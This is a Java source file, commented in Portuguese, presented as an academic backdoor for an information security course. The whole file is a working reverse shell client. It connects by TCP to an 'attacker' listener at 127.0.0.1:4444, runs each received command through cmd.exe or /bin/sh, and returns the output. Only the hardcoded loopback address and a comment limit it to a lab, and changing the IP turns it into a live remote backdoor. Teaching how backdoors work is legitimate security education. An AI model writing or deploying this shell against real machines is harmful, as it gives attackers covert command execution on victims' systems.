import java.io.*;
import java.net.*;

/**
 * ============================================================
 *  BACKDOOR ACADEMICO - Cliente da Vítima (Reverse Shell)
 *  Disciplina: Segurança da Informação
 *  Descrição : Conecta-se ao servidor do atacante via TCP.
 *              Recebe comandos, executa no shell local do SO e
 *              retorna a saída ao atacante.
 *
 *  USO EXCLUSIVO EM AMBIENTE CONTROLADO / LOOPBACK (127.0.0.1)
 * ============================================================
 */
public class BackdoorClient {

    // Endereço IP do atacante (servidor listener)
    private static final String ATTACKER_IP = "127.0.0.1";

    // Porta do servidor do atacante
    private static final int ATTACKER_PORT = 4444;

    // Comando que encerra a sessão
    private static final String EXIT_CMD = "exit";

    public static void main(String[] args) {
        System.out.println("[*] Conectando ao servidor: " + ATTACKER_IP + ":" + ATTACKER_PORT);

        // Tenta estabelecer a conexão TCP com o servidor do atacante
        try (Socket socket = new Socket(ATTACKER_IP, ATTACKER_PORT)) {
            System.out.println("[+] Conexão estabelecida!");

            // Fluxo de entrada: recebe comandos do atacante
            BufferedReader in = new BufferedReader(
                    new InputStreamReader(socket.getInputStream()));

            // Fluxo de saída: envia resultados de volta ao atacante
            PrintWriter out = new PrintWriter(
                    new BufferedWriter(new OutputStreamWriter(socket.getOutputStream())), true);

            // Detecta o sistema operacional para escolher o interpretador correto
            String os = System.getProperty("os.name").toLowerCase();
            String shell;
            String shellFlag;

            if (os.contains("win")) {
                // Windows: usa cmd.exe
                shell = "cmd.exe";
                shellFlag = "/c";
            } else {
                // Linux/macOS: usa /bin/sh
                shell = "/bin/sh";
                shellFlag = "-c";
            }

            System.out.println("[*] Shell detectado: " + shell);

            String command;
            // Loop principal: aguarda comandos do atacante
            while ((command = in.readLine()) != null) {

                // Verifica o comando de saída
                if (command.trim().equalsIgnoreCase(EXIT_CMD)) {
                    System.out.println("[*] Comando de saída recebido. Encerrando...");
                    break;
                }

                System.out.println("[>] Executando: " + command);

                // Executa o comando no shell do sistema operacional
                executeCommand(command, shell, shellFlag, out);
            }

        } catch (IOException e) {
            System.err.println("[!] Erro de conexão: " + e.getMessage());
        }

        System.out.println("[*] Backdoor encerrado.");
    }

    /**
     * Executa um comando no shell do SO e envia a saída de volta ao atacante.
     *
     * @param command   O comando a ser executado
     * @param shell     O interpretador de comandos (cmd.exe ou /bin/sh)
     * @param shellFlag Flag de execução (/c para cmd, -c para sh)
     * @param out       Fluxo de saída para enviar o resultado ao atacante
     */
    private static void executeCommand(String command, String shell, String shellFlag, PrintWriter out) {
        try {
            // Constrói o processo com shell + flag + comando
            ProcessBuilder pb = new ProcessBuilder(shell, shellFlag, command);

            // Redireciona stderr para stdout (captura erros também)
            pb.redirectErrorStream(true);

            // Inicia o processo
            Process process = pb.start();

            // Lê a saída do processo linha por linha
            BufferedReader processOutput = new BufferedReader(
                    new InputStreamReader(process.getInputStream()));

            String line;
            while ((line = processOutput.readLine()) != null) {
                // Envia cada linha da saída ao atacante
                out.println(line);
            }

            // Aguarda o processo terminar
            process.waitFor();

        } catch (IOException | InterruptedException e) {
            // Envia mensagem de erro ao atacante
            out.println("[ERRO] " + e.getMessage());
        }

        // Envia marcador de fim de resposta — protocolo acordado com o servidor
        out.println("##END##");
    }
}